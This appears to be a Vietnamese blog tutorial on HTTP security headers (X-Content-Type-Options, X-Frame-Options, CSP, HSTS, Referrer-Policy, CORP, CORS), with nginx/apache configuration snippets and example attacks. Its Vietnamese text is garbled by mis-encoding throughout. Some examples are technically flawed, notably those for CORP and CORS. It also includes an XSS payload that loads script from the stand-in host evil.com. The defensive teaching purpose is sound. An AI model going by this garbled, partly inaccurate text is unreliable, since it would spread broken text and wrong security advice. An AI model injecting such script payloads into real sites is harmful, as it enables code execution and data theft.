---
layout: post
title: HTTP Security Headers
subtitle: B·∫£o V·ªá Website Tr∆∞·ªõc C√°c Cu·ªôc T·∫•n C√¥ng M·∫°ng
tags: [web, security, pentest]
comments: true
date: 2025-04-09 19:23:00 +0700
---

# HTTP Security Headers: B·∫£o V·ªá Website Tr∆∞·ªõc C√°c Cu·ªôc T·∫•n C√¥ng M·∫°ng

## üìë M·ª•c l·ª•c

- [HTTP Security Headers: B·∫£o V·ªá Website Tr∆∞·ªõc C√°c Cu·ªôc T·∫•n C√¥ng M·∫°ng](#http-security-headers-b·∫£o-v·ªá-website-tr∆∞·ªõc-c√°c-cu·ªôc-t·∫•n-c√¥ng-m·∫°ng)
  - [üìë M·ª•c l·ª•c](#-m·ª•c-l·ª•c)
  - [T·∫°i Sao HTTP Security Headers Quan Tr·ªçng?](#t·∫°i-sao-http-security-headers-quan-tr·ªçng)
  - [Danh S√°ch C√°c HTTP Security Headers Quan Tr·ªçng](#danh-s√°ch-c√°c-http-security-headers-quan-tr·ªçng)
    - [1. **X-Content-Type-Options**](#1-x-content-type-options)
    - [2. **X-Frame-Options**](#2-x-frame-options)
    - [3. **Content-Security-Policy (CSP)**](#3-content-security-policy-csp)
    - [4. **Strict-Transport-Security (HSTS)**](#4-strict-transport-security-hsts)
    - [5. **Referrer-Policy**](#5-referrer-policy)
    - [6. **Cross-Origin-Resource-Policy (CORP)**](#6-cross-origin-resource-policy-corp)
    - [7. **Access-Control-Allow-Origin**](#7-access-control-allow-origin)

HTTP Security Headers l√† c√°c ti√™u ƒë·ªÅ HTTP m√† server g·ª≠i ƒë·∫øn tr√¨nh duy·ªát ƒë·ªÉ h∆∞·ªõng d·∫´n c√°ch x·ª≠ l√Ω n·ªôi dung v√† t∆∞∆°ng t√°c v·ªõi website. Ch√∫ng l√† l·ªõp ph√≤ng th·ªß quan tr·ªçng gi√∫p b·∫£o v·ªá website kh·ªèi c√°c cu·ªôc t·∫•n c√¥ng m·∫°ng ph·ªï bi·∫øn nh∆∞ Cross-Site Scripting (XSS), Clickjacking, Man-in-the-Middle (MitM), v√† nhi·ªÅu m·ªëi ƒëe d·ªça kh√°c. Trong b√†i blog n√†y, ch√∫ng ta s·∫Ω ƒëi s√¢u v√†o t·ª´ng ti√™u ƒë·ªÅ b·∫£o m·∫≠t, gi·∫£i th√≠ch c√°ch attackers c√≥ th·ªÉ khai th√°c ch√∫ng n·∫øu kh√¥ng ƒë∆∞·ª£c c·∫•u h√¨nh ƒë√∫ng, v√† c√°ch b·∫°n n√™n c·∫•u h√¨nh ch√∫ng ƒë·ªÉ tƒÉng c∆∞·ªùng b·∫£o m·∫≠t.

## T·∫°i Sao HTTP Security Headers Quan Tr·ªçng?

Khi tr√¨nh duy·ªát g·ª≠i y√™u c·∫ßu ƒë·∫øn server, server kh√¥ng ch·ªâ tr·∫£ v·ªÅ n·ªôi dung HTML m√† c√≤n g·ª≠i k√®m c√°c ti√™u ƒë·ªÅ HTTP. N·∫øu kh√¥ng c√≥ c√°c ti√™u ƒë·ªÅ b·∫£o m·∫≠t ho·∫∑c c·∫•u h√¨nh sai, attackers c√≥ th·ªÉ:

- **Ch√®n m√£ ƒë·ªôc**: Th·ª±c hi·ªán c√°c cu·ªôc t·∫•n c√¥ng XSS ƒë·ªÉ ƒë√°nh c·∫Øp d·ªØ li·ªáu ng∆∞·ªùi d√πng.
- **Gi·∫£ m·∫°o y√™u c·∫ßu**: S·ª≠ d·ª•ng CSRF ƒë·ªÉ th·ª±c hi·ªán h√†nh ƒë·ªông tr√°i ph√©p thay m·∫∑t ng∆∞·ªùi d√πng.
- **ƒê√°nh c·∫Øp th√¥ng tin**: Khai th√°c k·∫øt n·ªëi kh√¥ng m√£ h√≥a ho·∫∑c th√¥ng tin r√≤ r·ªâ t·ª´ headers.
- **L·ª´a ƒë·∫£o ng∆∞·ªùi d√πng**: S·ª≠ d·ª•ng Clickjacking ƒë·ªÉ ƒë√°nh l·ª´a ng∆∞·ªùi d√πng nh·∫•p v√†o n·ªôi dung ƒë·ªôc h·∫°i.

C·∫•u h√¨nh ƒë√∫ng c√°c HTTP Security Headers kh√¥ng ch·ªâ gi·∫£m thi·ªÉu r·ªßi ro m√† c√≤n gi√∫p website tu√¢n th·ªß c√°c ti√™u chu·∫©n b·∫£o m·∫≠t hi·ªán ƒë·∫°i, tƒÉng uy t√≠n v·ªõi ng∆∞·ªùi d√πng v√† c√¥ng c·ª• t√¨m ki·∫øm.

## Danh S√°ch C√°c HTTP Security Headers Quan Tr·ªçng

### 1. **X-Content-Type-Options**

- **M√¥ t·∫£**: NgƒÉn tr√¨nh duy·ªát "ƒëo√°n" ki·ªÉu n·ªôi dung (MIME type) c·ªßa t·ªáp n·∫øu server kh√¥ng ch·ªâ ƒë·ªãnh r√µ r√†ng.
- **Gi√° tr·ªã h·ª£p l·ªá**: `nosniff`.
- **R·ªßi ro n·∫øu kh√¥ng c√≥**:
  - Attackers c√≥ th·ªÉ t·∫£i l√™n t·ªáp ƒë·ªôc h·∫°i (v√≠ d·ª•: m·ªôt file `.jpg` ch·ª©a m√£ JavaScript) v√† l·ª´a tr√¨nh duy·ªát th·ª±c thi n√≥ nh∆∞ script. ƒê√¢y l√† k·ªπ thu·∫≠t "MIME type sniffing attack".
- **V√≠ d·ª• khai th√°c**:
  - M·ªôt attacker t·∫£i l√™n file `malicious.jpg` ch·ª©a m√£ `<script>alert('Hacked');</script>`. N·∫øu server kh√¥ng ƒë·ªãnh nghƒ©a MIME type v√† tr√¨nh duy·ªát "sniff" th√†nh `text/javascript`, m√£ ƒë·ªôc s·∫Ω ch·∫°y ngay l·∫≠p t·ª©c.
- **C√°ch c·∫•u h√¨nh**:
  ```nginx
  add_header X-Content-Type-Options "nosniff";
  ```
- **L·ª£i √≠ch**: ƒê·∫£m b·∫£o tr√¨nh duy·ªát ch·ªâ x·ª≠ l√Ω n·ªôi dung theo MIME type do server ch·ªâ ƒë·ªãnh, ngƒÉn ch·∫∑n c√°c cu·ªôc t·∫•n c√¥ng d·ª±a tr√™n MIME type.
- **Tham Kh·∫£o**:
  - [https://hackerone.com/reports/369979](https://hackerone.com/reports/369979)
  - [https://hackerone.com/reports/9479](https://hackerone.com/reports/9479)

### 2. **X-Frame-Options**

- **M√¥ t·∫£**: NgƒÉn website b·ªã nh√∫ng trong iframe, b·∫£o v·ªá ch·ªëng l·∫°i Clickjacking.
- **Gi√° tr·ªã h·ª£p l·ªá**: DENY, SAMEORIGIN.
- **R·ªßi ro n·∫øu kh√¥ng c√≥**:
  - Attackers c√≥ th·ªÉ nh√∫ng website c·ªßa b·∫°n v√†o iframe tr√™n trang ƒë·ªôc h·∫°i, ph·ªß giao di·ªán gi·∫£ m·∫°o ƒë·ªÉ l·ª´a ng∆∞·ªùi d√πng nh·∫≠p th√¥ng tin nh·∫°y c·∫£m (nh∆∞ m·∫≠t kh·∫©u ho·∫∑c th√¥ng tin th·∫ª t√≠n d·ª•ng).
- **V√≠ d·ª• khai th√°c**:
  - M·ªôt trang web gi·∫£ m·∫°o nh√∫ng trang ƒëƒÉng nh·∫≠p c·ªßa b·∫°n trong iframe: `<iframe src="https://yourwebsite.com/login"></iframe>`. Ng∆∞·ªùi d√πng kh√¥ng nh·∫≠n ra v√† nh·∫≠p th√¥ng tin, attacker ghi l·∫°i d·ªØ li·ªáu qua c√°c l·ªõp giao di·ªán gi·∫£.
- **C√°ch c·∫•u h√¨nh**:

nginx:

```nginx
add_header X-Frame-Options "DENY";
```

apache:

```apache
Header set X-Frame-Options "DENY"
```

- **L·ª£i √≠ch**: NgƒÉn website b·ªã l·∫°m d·ª•ng trong c√°c cu·ªôc t·∫•n c√¥ng Clickjacking.
- **Tham Kh·∫£o**:
  - [https://hackerone.com/reports/283951](https://hackerone.com/reports/283951)
  - [https://hackerone.com/reports/163646](https://hackerone.com/reports/163646)
  - [https://hackerone.com/reports/27594](https://hackerone.com/reports/27594)

### 3. **Content-Security-Policy (CSP)**

- **M√¥ t·∫£**: Ki·ªÉm so√°t ngu·ªìn t√†i nguy√™n (script, h√¨nh ·∫£nh, v.v.) m√† tr√¨nh duy·ªát ƒë∆∞·ª£c ph√©p t·∫£i, gi·∫£m nguy c∆° XSS v√† c√°c m√£ ƒë·ªôc kh√°c.
- **Gi√° tr·ªã h·ª£p l·ªá**: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';.
- **R·ªßi ro n·∫øu kh√¥ng c√≥**:
  - Attackers c√≥ th·ªÉ ch√®n m√£ JavaScript t·ª´ ngu·ªìn b√™n ngo√†i ho·∫∑c n·ªôi tuy·∫øn (inline script) ƒë·ªÉ th·ª±c thi m√£ ƒë·ªôc, ƒë√°nh c·∫Øp cookie, ho·∫∑c thao t√∫ng n·ªôi dung.
- **V√≠ d·ª• khai th√°c**:
  N·∫øu kh√¥ng c√≥ CSP, m·ªôt l·ªó h·ªïng XSS cho ph√©p ch√®n `<script src="https://evil.com/malware.js"></script>` s·∫Ω ch·∫°y m√£ ƒë·ªôc t·ª´ server c·ªßa attacker.
- **C√°ch c·∫•u h√¨nh**:

nginx:

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';";
```

apache:

```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"
```

- **L·ª£i √≠ch**: Gi·ªõi h·∫°n ngu·ªìn t√†i nguy√™n h·ª£p l·ªá, gi·∫£m b·ªÅ m·∫∑t t·∫•n c√¥ng t·ª´ XSS v√† c√°c m√£ ƒë·ªôc kh√°c.

- **Tham Kh·∫£o**
  - [https://hackerone.com/reports/47472](https://hackerone.com/reports/47472)
  - [https://hackerone.com/reports/1588732](https://hackerone.com/reports/1588732)
  - [https://hackerone.com/reports/1481207](https://hackerone.com/reports/1481207)

### 4. **Strict-Transport-Security (HSTS)**

- **M√¥ t·∫£**: Bu·ªôc tr√¨nh duy·ªát ch·ªâ s·ª≠ d·ª•ng HTTPS, ngƒÉn k·∫øt n·ªëi HTTP kh√¥ng m√£ h√≥a.
- **Gi√° tr·ªã h·ª£p l·ªá**: max-age=31536000; includeSubDomains; preload.
- **R·ªßi ro n·∫øu kh√¥ng c√≥**:
  - Attackers c√≥ th·ªÉ th·ª±c hi·ªán t·∫•n c√¥ng MitM ho·∫∑c "SSL stripping" ƒë·ªÉ chuy·ªÉn h∆∞·ªõng ng∆∞·ªùi d√πng sang HTTP, ƒë√°nh c·∫Øp d·ªØ li·ªáu nh·∫°y c·∫£m nh∆∞ cookie ho·∫∑c th√¥ng tin ƒëƒÉng nh·∫≠p.
- **V√≠ d·ª• khai th√°c**:
  - Ng∆∞·ªùi d√πng truy c·∫≠p `http://yourwebsite.com` thay v√¨ `https://`, attacker ch·∫∑n k·∫øt n·ªëi, gi·∫£ m·∫°o n·ªôi dung v√† l·∫•y c·∫Øp th√¥ng tin.
- **C√°ch c·∫•u h√¨nh**:

nginx:

```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
```

apache:

```apache
Header set Strict-Transport-Security "max-age=31536000; includeSubDomains"
```

- **L·ª£i √≠ch**: ƒê·∫£m b·∫£o m·ªçi k·∫øt n·ªëi ƒë·ªÅu ƒë∆∞·ª£c m√£ h√≥a, gi·∫£m nguy c∆° b·ªã t·∫•n c√¥ng qua m·∫°ng.
- **Tham Kh·∫£o**:
  - [https://hackerone.com/reports/20072](https://hackerone.com/reports/20072)
  - [https://hackerone.com/reports/7969](https://hackerone.com/reports/7969)

### 5. **Referrer-Policy**

- **M√¥ t·∫£**: Ki·ªÉm so√°t th√¥ng tin Referer ƒë∆∞·ª£c g·ª≠i khi ng∆∞·ªùi d√πng nh·∫•p v√†o li√™n k·∫øt.
- **Gi√° tr·ªã h·ª£p l·ªá**: no-referrer, strict-origin-when-cross-origin.
- **R·ªßi ro n·∫øu kh√¥ng c√≥**:
  - Attackers c√≥ th·ªÉ thu th·∫≠p th√¥ng tin nh·∫°y c·∫£m t·ª´ header Referer (nh∆∞ token, tham s·ªë URL).
- **V√≠ d·ª• khai th√°c**:
  - URL `https://yourwebsite.com/reset?token=abc123` ƒë∆∞·ª£c g·ª≠i trong Referer khi ng∆∞·ªùi d√πng nh·∫•p sang trang ƒë·ªôc h·∫°i, attacker thu th·∫≠p token ƒë·ªÉ chi·∫øm quy·ªÅn.
- **C√°ch c·∫•u h√¨nh**:

```nginx
add_header Referrer-Policy "strict-origin-when-cross-origin";
```

- **L·ª£i √≠ch**: B·∫£o v·ªá th√¥ng tin nh·∫°y c·∫£m kh·ªèi b·ªã r√≤ r·ªâ qua header `Referer`.
- **Tham Kh·∫£o**:
  - [https://hackerone.com/reports/2133308](https://hackerone.com/reports/2133308)
  - [https://hackerone.com/reports/787160](https://hackerone.com/reports/787160)
  - [https://hackerone.com/reports/5199](https://hackerone.com/reports/5199)

### 6. **Cross-Origin-Resource-Policy (CORP)**

- **M√¥ t·∫£**: Ki·ªÉm so√°t c√°ch t√†i nguy√™n ƒë∆∞·ª£c chia s·∫ª v·ªõi c√°c origin kh√°c.
- **Gi√° tr·ªã h·ª£p l·ªá**: same-origin, same-site, cross-origin.
- **R·ªßi ro n·∫øu kh√¥ng c√≥**:
  - Attackers c√≥ th·ªÉ t·∫£i t√†i nguy√™n t·ª´ website c·ªßa b·∫°n (nh∆∞ h√¨nh ·∫£nh, script) v√† s·ª≠ d·ª•ng ch√∫ng trong c√°c trang ƒë·ªôc h·∫°i.
- **V√≠ d·ª• khai th√°c**:
  - M·ªôt trang ƒë·ªôc h·∫°i t·∫£i `<img src="https://evil.com/sensitive-image.jpg">` v√† s·ª≠ d·ª•ng ƒë·ªÉ ph√¢n t√≠ch ho·∫∑c ƒë√°nh l·ª´a ng∆∞·ªùi d√πng.
- **C√°ch c·∫•u h√¨nh**:

```nginx
add_header Cross-Origin-Resource-Policy "same-origin";
```

- **L·ª£i √≠ch**: Gi·ªõi h·∫°n vi·ªác chia s·∫ª t√†i nguy√™n, gi·∫£m nguy c∆° b·ªã l·∫°m d·ª•ng.
- **Tham Kh·∫£o**:
  - [https://hackerone.com/reports/958459](https://hackerone.com/reports/958459)
  - [https://hackerone.com/reports/426165](https://hackerone.com/reports/426165)
  - [https://hackerone.com/reports/13551](https://hackerone.com/reports/13551)
  - [https://hackerone.com/reports/2332728](https://hackerone.com/reports/2332728)

### 7. **Access-Control-Allow-Origin**

- **M√¥ t·∫£**: Ki·ªÉm so√°t c√°c origin ƒë∆∞·ª£c ph√©p truy c·∫≠p t√†i nguy√™n qua CORS.
- **Gi√° tr·ªã h·ª£p l·ªá**: \*, https://trusted.com.
- **R·ªßi ro n·∫øu c·∫•u h√¨nh sai**:
  - N·∫øu ƒë·∫∑t \*, attackers c√≥ th·ªÉ truy c·∫≠p t√†i nguy√™n t·ª´ b·∫•t k·ª≥ origin n√†o, d·∫´n ƒë·∫øn r√≤ r·ªâ d·ªØ li·ªáu.
- **V√≠ d·ª• khai th√°c**:
  - API tr·∫£ v·ªÅ d·ªØ li·ªáu nh·∫°y c·∫£m b·ªã trang ƒë·ªôc h·∫°i truy c·∫≠p qua <script src="https://yourwebsite.com/api">.
- **C√°ch c·∫•u h√¨nh**:

```nginx
add_header Access-Control-Allow-Origin "https://trusted.com";
```

- **L·ª£i √≠ch**: Gi·ªõi h·∫°n truy c·∫≠p t√†i nguy√™n ch·ªâ t·ª´ c√°c origin tin c·∫≠y.
